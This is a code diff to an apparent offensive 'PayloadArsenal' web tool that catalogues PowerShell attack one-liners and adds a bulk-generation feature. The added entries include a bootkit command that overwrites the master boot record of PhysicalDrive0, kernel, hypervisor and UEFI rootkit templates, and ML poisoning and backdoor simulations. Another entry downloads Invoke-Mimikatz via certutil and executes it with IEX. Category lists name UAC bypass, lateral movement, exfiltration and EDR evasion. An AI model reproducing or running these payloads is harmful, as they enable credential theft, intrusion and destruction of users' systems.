+    command: "$driverCode=@'#include <ntddk.h>NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath){DbgPrint(\"Rootkit driver loaded\");DriverObject->DriverUnload=UnloadDriver;return STATUS_SUCCESS;}VOID UnloadDriver(PDRIVER_OBJECT DriverObject){DbgPrint(\"Rootkit driver unloaded\");}'@;$driverPath=\"$env:temp\\rootkit.c\";$driverCode|Out-File $driverPath -Encoding ASCII;$compileCmd=\"cl.exe /kernel /c $driverPath\";try{Invoke-Expression $compileCmd;Write-Host 'Kernel driver compiled - requires signing and loading'}catch{Write-Host 'Driver compilation requires Windows DDK'}",
+    description: "Advanced kernel-level rootkit driver development template with basic stealth capabilities.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Rootkit",
+    author: "0x0806",
+    tags: ["rootkit", "kernel", "driver", "stealth"],
+    mitre_id: "T1014",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "Kernel-level operations require elevated privileges and proper signing"
+  },
+  bootkit: {
+    command: "$mbr=New-Object byte[] 512;$bootCode=@(0xEB,0x3C,0x90,0x4D,0x53,0x44,0x4F,0x53,0x35,0x2E,0x30,0x00,0x02,0x01,0x01,0x00,0x02,0xE0,0x00,0x40,0x0B,0xF0,0x09,0x00,0x12,0x00,0x02,0x00);for($i=0;$i -lt $bootCode.Length;$i++){$mbr[$i]=$bootCode[$i]};$mbr[510]=0x55;$mbr[511]=0xAA;$drivePath='\\\\.\\PhysicalDrive0';try{$drive=[System.IO.File]::OpenWrite($drivePath);$drive.Write($mbr,0,512);$drive.Close();Write-Host 'Bootkit infection attempt - DANGEROUS'}catch{Write-Host 'Bootkit installation failed - requires admin privileges'}",
+    description: "Advanced bootkit creation for persistent boot-level infection (DANGEROUS - Educational only).",
+    complexity: "expert",
+    platform: "windows",
+    category: "Rootkit",
+    author: "0x0806",
+    tags: ["bootkit", "mbr", "persistence", "boot"],
+    mitre_id: "T1542.003",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "EXTREMELY DANGEROUS - Can destroy system boot capability"
+  },
+  hypervisor_rootkit: {
+    command: "$vmxSupport=((Get-WmiObject -Class Win32_Processor).VirtualizationFirmwareEnabled -eq $true);if($vmxSupport){$hypervisorCode=@'#include <windows.h>#include <winternl.h>typedef struct _SYSTEM_HYPERVISOR_DETAIL_INFORMATION{ULONG HypervisorPresent;ULONG HypervisorDebuggingEnabled;ULONG HypervisorPerformanceCountingEnabled;ULONG HypervisorCounterSetRegistersAccessible;} SYSTEM_HYPERVISOR_DETAIL_INFORMATION;'@;Write-Host 'Hypervisor support detected - rootkit deployment possible'}else{Write-Host 'No hypervisor support - rootkit cannot be deployed'}",
+    description: "Advanced hypervisor-based rootkit detection and deployment framework for maximum stealth.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Rootkit",
+    author: "0x0806",
+    tags: ["hypervisor", "rootkit", "vmx", "hardware"],
+    mitre_id: "T1014",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  firmware_rootkit: {
+    command: "$uefiAccess=$false;try{$firmware=Get-ComputerInfo|Select -ExpandProperty BiosFirmwareType;if($firmware -eq 'Uefi'){$uefiVars=Get-SecureBootUEFI -Name SetupMode -EA SilentlyContinue;if($uefiVars){$uefiAccess=$true}}}catch{};if($uefiAccess){Write-Host 'UEFI access available - firmware rootkit possible';$uefiPayload=@'EFI rootkit payload would be inserted here'@}else{Write-Host 'No UEFI access - firmware rootkit not possible'}",
+    description: "Advanced UEFI firmware rootkit detection and payload insertion framework.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Pre-OS Boot",
+    author: "0x0806",
+    tags: ["firmware", "uefi", "rootkit", "boot"],
+    mitre_id: "T1542.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5,
+    warning: "Firmware modifications can brick systems"
+  },
+
+  // AI/ML Evasion
+  ml_poisoning: {
+    command: "$trainingData=@();for($i=0;$i -lt 1000;$i++){$features=@(Get-Random -Max 100,Get-Random -Max 100,Get-Random -Max 100);$label=if($i%10 -eq 0){1}else{0};$trainingData+=@{features=$features;label=$label}};$poisonedData=$trainingData|ForEach{if($_.label -eq 1){$_.features[0]+=50;$_.features[1]-=30;$_.label=0};$_};Write-Host \"Generated $($trainingData.Count) training samples with $($poisonedData|Where label -eq 0|Measure|Select -Expand Count) poisoned samples\"",
+    description: "Advanced machine learning model poisoning attack simulation for AI security research.",
+    complexity: "expert",
+    platform: "windows",
+    category: "ML Model Poisoning",
+    author: "0x0806",
+    tags: ["ai", "ml", "poisoning", "backdoor"],
+    mitre_id: "T1565.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  adversarial_examples: {
+    command: "$imageVector=1..784|ForEach{Get-Random -Max 255};$perturbation=1..784|ForEach{(Get-Random -Max 20)-10};$adversarialImage=for($i=0;$i -lt 784;$i++){[Math]::Max(0,[Math]::Min(255,$imageVector[$i]+$perturbation[$i]))};$confidence=Get-Random -Max 100;Write-Host \"Generated adversarial example with $confidence% confidence shift\";$encoded=[Convert]::ToBase64String([byte[]]$adversarialImage[0..99]);Write-Host \"Sample adversarial data: $($encoded.Substring(0,50))...\"",
+    description: "Advanced adversarial example generation for evading machine learning classifiers and detection systems.",
+    complexity: "expert",
+    platform: "windows",
+    category: "ML Adversarial Attack",
+    author: "0x0806",
+    tags: ["adversarial", "ml", "evasion", "perturbation"],
+    mitre_id: "T1562.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  model_inversion: {
+    command: "$targetModel=@{weights=1..100|ForEach{(Get-Random)*2-1};bias=Get-Random};$queries=@();for($i=0;$i -lt 500;$i++){$input=1..10|ForEach{Get-Random};$output=$targetModel.weights[0]*$input[0]+$targetModel.bias+(Get-Random -Max 0.1);$queries+=@{input=$input;output=$output}};$reconstructed=@{};$queries|Group-Object output|ForEach{$reconstructed[$_.Name]=$_.Group[0].input};Write-Host \"Model inversion completed with $($queries.Count) queries and $($reconstructed.Count) reconstructed inputs\"",
+    description: "Advanced model inversion attack for extracting sensitive training data from machine learning models.",
+    complexity: "expert",
+    platform: "windows",
+    category: "ML Model Inversion",
+    author: "0x0806",
+    tags: ["model", "inversion", "privacy", "extraction"],
+    mitre_id: "T1005",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+  backdoor_triggers: {
+    command: "$triggerPattern=@(42,17,83,91,55);$normalSamples=@();$backdoorSamples=@();for($i=0;$i -lt 200;$i++){$sample=1..100|ForEach{Get-Random -Max 256};$normalSamples+=$sample};for($i=0;$i -lt 20;$i++){$sample=1..100|ForEach{Get-Random -Max 256};foreach($pos in 0,10,20,30,40){$sample[$pos]=$triggerPattern[$pos/10]};$backdoorSamples+=$sample};Write-Host \"Generated $($normalSamples.Count) normal and $($backdoorSamples.Count) backdoored samples\";$triggerHex=$triggerPattern|ForEach{$_.ToString('X2')};Write-Host \"Backdoor trigger pattern: $($triggerHex -join ' ')\"",
+    description: "Advanced neural network backdoor trigger generation for persistent model compromise.",
+    complexity: "expert",
+    platform: "windows",
+    category: "ML Backdoor Attack",
+    author: "0x0806",
+    tags: ["backdoor", "trigger", "neural", "network"],
+    mitre_id: "T1546.016",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
   // Living Off The Land (LOLBAS)
   certutil_download: {
     command: "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$output=\"$env:temp\\update.txt\";$encoded=\"$env:temp\\update.b64\";certutil.exe -urlcache -split -f $url $encoded;certutil.exe -decode $encoded $output;$content=Get-Content $output -Raw;Remove-Item $encoded,$output -Force -EA SilentlyContinue;if($content){Write-Host 'Payload downloaded and decoded via CertUtil';IEX $content}else{Write-Host 'Download failed'}",
@@ -876,14 +1286,21 @@ class PayloadArsenal {
             basic: ['sysinfo', 'processes', 'services', 'network'],
             filesystem: ['listfiles', 'findfiles', 'credentials_search'],
             security: ['currentuser', 'localusers', 'groups', 'privileges'],
-            advanced: ['encoded', 'oneliner', 'registry', 'eventlogs'],
+            advanced: ['encoded', 'oneliner', 'registry', 'eventlogs', 'dns_steganography', 'quantum_safe_encryption'],
             edr: ['amsibypass', 'etw_bypass', 'scriptblock_bypass', 'constrained_bypass', 'reflective_loading', 'obfuscated_invoke'],
-            memory: ['memory_patching', 'syscall_direct', 'heaven_gate', 'manual_dll_loading', 'process_hollowing'],
-            network: ['dns_tunneling', 'icmp_tunnel', 'tcp_beacon', 'http_tunnel'],
-            persistence: ['wmi_backdoor', 'scheduled_task_stealth', 'image_file_execution', 'service_persistence'],
+            memory: ['memory_patching', 'syscall_direct', 'heaven_gate', 'manual_dll_loading', 'process_hollowing', 'atom_bombing'],
+            network: ['dns_tunneling', 'icmp_tunnel', 'tcp_beacon', 'http_tunnel', 'blockchain_c2'],
+            persistence: ['wmi_backdoor', 'scheduled_task_stealth', 'image_file_execution', 'service_persistence', 'com_hijacking', 'uefi_persistence'],
             analysis: ['timing_evasion', 'mouse_movement', 'vm_detection', 'debugger_detection'],
             encryption: ['chacha20_encryption', 'polymorphic_shellcode', 'string_encryption'],
-            lolbas: ['certutil_download', 'bitsadmin_download', 'regsvr32_bypass', 'mshta_execution']
+            lolbas: ['certutil_download', 'bitsadmin_download', 'regsvr32_bypass', 'mshta_execution'],
+            privilege: ['uac_bypass', 'token_manipulation', 'service_escalation', 'dll_hijacking'],
+            lateral: ['psexec_variant', 'wmi_execution', 'dcom_execution', 'smb_exploitation'],
+            exfiltration: ['http_exfiltration', 'email_exfiltration', 'cloud_exfiltration', 'steganography'],
+            rootkit: ['kernel_driver', 'bootkit', 'hypervisor_rootkit', 'firmware_rootkit'],
+            ai_evasion: ['ml_poisoning', 'adversarial_examples', 'model_inversion', 'backdoor_triggers', 'ml_adversarial_evasion'],
+            hardware: ['hardware_keylogger', 'speculative_execution'],
+            zero_day: ['zero_day_framework', 'fileless_reflective_pe']
         };
     }
 
@@ -929,16 +1346,23 @@ class PayloadArsenal {
                 <h3>${this.formatTitle(key)}</h3>
                 <div class="card-badges">
                     <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
-                    ${payload.evasion_rating ? `<span class="evasion-badge">${'★'.repeat(payload.evasion_rating)}</span>` : ''}
+                    ${payload.evasion_rating ? `<span class="evasion-badge" title="Evasion Rating">${'★'.repeat(payload.evasion_rating)}</span>` : ''}
                 </div>
             </div>
             <p class="card-description">${payload.description}</p>
             ${payload.warning ? `<div class="card-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
             <div class="card-tags">
-                ${payload.tags ? payload.tags.slice(0, 3).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
+                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
+            </div>
+            <div class="card-metadata">
+                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
+                <span class="detection-tag">Detection: ${payload.detection_difficulty || 'Unknown'}</span>
             </div>
             <div class="card-actions">
                 <button class="btn-primary" onclick="app.generatePayload('${key}')">
+                    <i class="fas fa-plus"></i> Select
+                </button>
+                <button class="btn-secondary" onclick="app.generateSinglePayload('${key}')">
                     <i class="fas fa-play"></i> Generate
                 </button>
                 <button class="btn-secondary" onclick="app.showPayloadDetails('${key}')">
@@ -960,6 +1384,13 @@ class PayloadArsenal {
     }
 
     generatePayload(type) {
+        this.selectedPayloads = this.selectedPayloads || new Set();
+        this.selectedPayloads.add(type);
+        this.updateBulkUI();
+        this.showNotification(`Added "${this.formatTitle(type)}" to selection`, 'info');
+    }
+
+    generateSinglePayload(type) {
         const startTime = performance.now();
         const payload = payloads[type];
         if (!payload) return;
@@ -1038,6 +1469,106 @@ class PayloadArsenal {
                 silent: true
             });
         }
+    }
+
+    updateBulkUI() {
+        const bulkPanel = document.getElementById('bulkPanel');
+        const selectedCount = document.getElementById('selectedCount');
+        const selectedList = document.getElementById('selectedList');
+        
+        if (this.selectedPayloads && this.selectedPayloads.size > 0) {
+            bulkPanel.classList.add('active');
+            selectedCount.textContent = this.selectedPayloads.size;
+            
+            selectedList.innerHTML = '';
+            this.selectedPayloads.forEach(type => {
+                const item = document.createElement('div');
+                item.className = 'selected-item';
+                item.innerHTML = `
+                    <span>${this.formatTitle(type)}</span>
+                    <button onclick="app.removeFromSelection('${type}')" class="btn-remove">
+                        <i class="fas fa-times"></i>
+                    </button>
+                `;
+                selectedList.appendChild(item);
+            });
+        } else {
+            bulkPanel.classList.remove('active');
+        }
+    }
+
+    removeFromSelection(type) {
+        if (this.selectedPayloads) {
+            this.selectedPayloads.delete(type);
+            this.updateBulkUI();
+            this.showNotification(`Removed "${this.formatTitle(type)}" from selection`, 'info');
+        }
+    }
+
+    clearSelection() {
+        this.selectedPayloads = new Set();
+        this.updateBulkUI();
+        this.showNotification('Selection cleared', 'info');
+    }
+
+    generateBulkPayloads() {
+        if (!this.selectedPayloads || this.selectedPayloads.size === 0) {
+            this.showNotification('No payloads selected', 'warning');
+            return;
+        }
+
+        let bulkOutput = '';
+        let bulkMetadata = [];
+        
+        this.selectedPayloads.forEach(type => {
+            const payload = payloads[type];
+            if (payload) {
+                bulkOutput += `# ${this.formatTitle(type)} - ${payload.category}\n`;
+                bulkOutput += `# ${payload.description}\n`;
+                bulkOutput += `${payload.command}\n\n`;
+                
+                bulkMetadata.push({
+                    name: this.formatTitle(type),
+                    complexity: payload.complexity,
+                    category: payload.category,
+                    mitre: payload.mitre_id
+                });
+            }
+        });
+
+        // Show output panel
+        const outputPanel = document.getElementById('outputPanel');
+        outputPanel.classList.add('active');
+
+        document.getElementById('payloadOutput').textContent = bulkOutput;
+        document.getElementById('description').textContent = `Bulk generated ${this.selectedPayloads.size} payloads`;
+        
+        const metadata = document.getElementById('metadata');
+        metadata.innerHTML = `
+            <div class="bulk-metadata">
+                <div class="metadata-item">
+                    <strong>Total Payloads:</strong> ${this.selectedPayloads.size}
+                </div>
+                <div class="metadata-item">
+                    <strong>Generated:</strong> ${new Date().toLocaleString()}
+                </div>
+                <div class="metadata-item">
+                    <strong>Total Length:</strong> ${bulkOutput.length} characters
+                </div>
+                <div class="bulk-list">
+                    ${bulkMetadata.map(item => `
+                        <div class="bulk-item">
+                            <span class="name">${item.name}</span>
+                            <span class="complexity-${item.complexity}">${item.complexity}</span>
+                            <span class="category">${item.category}</span>
+                        </div>
+                    `).join('')}
+                </div>
+            </div>
+        `;
+
+        this.applySyntaxHighlighting();
+        this.showNotification(`Generated ${this.selectedPayloads.size} payloads successfully!`, 'success');
     }
 
     showPayloadDetails(type) {
